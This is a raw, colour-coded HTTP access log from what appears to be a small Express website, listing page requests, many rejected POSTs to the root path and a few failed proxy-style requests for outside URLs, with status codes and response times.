[0mGET http://s.taobao.com/search?q=xiaomi&imgfile=&commend=all&ssid=s5-e&search_type=item&sourceId=tb.index&spm=a21bo.50862.201856-taobao-item.1&ie=utf8&initiative_id=tbindexz_20170427 [33m404 [0m2.597 ms - 4377[0m
[0mGET http://www.dianping.com/search/category/2/10/g117 [33m404 [0m1.872 ms - 4377[0m
[0mPOST / [33m404 [0m2.433 ms - 4377[0m
[0mPOST / [33m404 [0m2.464 ms - 4377[0m
[0mPOST / [33m404 [0m1.971 ms - 4377[0m
[0mPOST / [33m404 [0m2.873 ms - 4377[0m
[0mPOST / [33m404 [0m1.905 ms - 4377[0m
[0mPOST / [33m404 [0m1.925 ms - 4377[0m
[0mPOST / [33m404 [0m2.678 ms - 4377[0m
[0mGET / [32m200 [0m2.730 ms - 10182[0m
[0mPOST / [33m404 [0m3.839 ms - 4377[0m
[0mPOST / [33m404 [0m1.969 ms - 4377[0m
[0mPOST / [33m404 [0m1.952 ms - 4377[0m
[0mPOST / [33m404 [0m2.462 ms - 4377[0m
[0mPOST / [33m404 [0m2.005 ms - 4377[0m
[0mPOST / [33m404 [0m2.496 ms - 4377[0m
[0mPOST / [33m404 [0m1.987 ms - 4377[0m
[0mPOST / [33m404 [0m2.559 ms - 4377[0m
[0mPOST / [33m404 [0m8.207 ms - 4377[0m
[0mPOST / [33m404 [0m1.859 ms - 4377[0m
[0mPOST / [33m404 [0m2.047 ms - 4377[0m
[0mPOST / [33m404 [0m2.501 ms - 4377[0m
[0mPOST / [33m404 [0m1.946 ms - 4377[0m
[0mPOST / [33m404 [0m2.445 ms - 4377[0m
[0mPOST / [33m404 [0m1.933 ms - 4377[0m
[0mPOST / [33m404 [0m1.993 ms - 4377[0m
[0mGET /products [32m200 [0m2.946 ms - 7515[0m
[0mPOST / [33m404 [0m1.944 ms - 4377[0m
[0mPOST / [33m404 [0m1.884 ms - 4377[0m
[0mPOST / [33m404 [0m2.535 ms - 4377[0m
[0mPOST / [33m404 [0m1.946 ms - 4377[0m
[0mPOST / [33m404 [0m2.382 ms - 4377[0m
[0mGET / [36m304 [0m2.823 ms - -[0m
[0mPOST / [33m404 [0m2.582 ms - 4377[0m
[0mGET /courses [36m304 [0m4.135 ms - -[0m
[0mPOST / [33m404 [0m2.551 ms - 4377[0m
[0mPOST / [33m404 [0m2.501 ms - 4377[0m
[0mPOST / [33m404 [0m2.010 ms - 4377[0m
[0mPOST / [33m404 [0m2.547 ms - 4377[0m
[0mPOST / [33m404 [0m1.995 ms - 4377[0m
[0mGET http://clientapi.ipip.net/echo.php?info=20170514031623 [33m404 [0m2.439 ms - 4377[0m
[0mPOST / [33m404 [0m2.479 ms - 4377[0m
[0mGET / [32m200 [0m2.710 ms - 10182[0m
[0mPOST / [33m404 [0m2.432 ms - 4377[0m
[0mGET /courses [32m200 [0m4.002 ms - 13968[0m
[0mPOST / [33m404 [0m2.086 ms - 4377[0m
[0mPOST / [33m404 [0m2.278 ms - 4377[0m
[0mPOST / [33m404 [0m2.229 ms - 4377[0m
[0mGET /services [32m200 [0m3.897 ms - 14452[0m
[0mPOST / [33m404 [0m2.312 ms - 4377[0m
[0mPOST / [33m404 [0m2.349 ms - 4377[0m
[0mPOST / [33m404 [0m2.906 ms - 4377[0m
[0mGET /contact [36m304 [0m2.523 ms - -[0m
[0mGET /courses [36m304 [0m3.585 ms - -[0m
[0mGET /public/stylesheets/bootstrap.min.css.map [33m404 [0m1.857 ms - 4377[0m
[0mGET /public/stylesheets/bootstrap.min.css.map [33m404 [0m2.610 ms - 4377[0m
[0mGET /services [36m304 [0m4.281 ms - -[0m
[0mGET /products [36m304 [0m2.945 ms - -[0m
[0mGET /public/stylesheets/bootstrap.min.css.map [33m404 [0m1.801 ms - 4377[0m
[0mGET /contact [36m304 [0m3.018 ms - -[0m
[0mGET / [32m200 [0m9.364 ms - 10182[0m
[0mGET / [32m200 [0m3.278 ms - 10182[0m
[0mGET /index.html [33m404 [0m1.964 ms - 4377[0m
[0mGET /index.html [33m404 [0m1.872 ms - 4377[0m
[0mGET /contact [36m304 [0m2.992 ms - -[0m
[0mGET /products [36m304 [0m2.910 ms - -[0m
[0mGET /services [36m304 [0m4.574 ms - -[0m
[0mGET / [32m200 [0m2.865 ms - 10182[0m
[0mGET /index [36m304 [0m3.448 ms - -[0m
[0mGET /courses [36m304 [0m5.609 ms - -[0m
[0mGET /portfolio-item.html [33m404 [0m2.019 ms - 4377[0m
[0mGET /services [36m304 [0m4.274 ms - -[0m
[0mGET /products [36m304 [0m3.009 ms - -[0m
[0mGET /public/stylesheets/bootstrap.min.css.map [33m404 [0m1.844 ms - 4377[0m
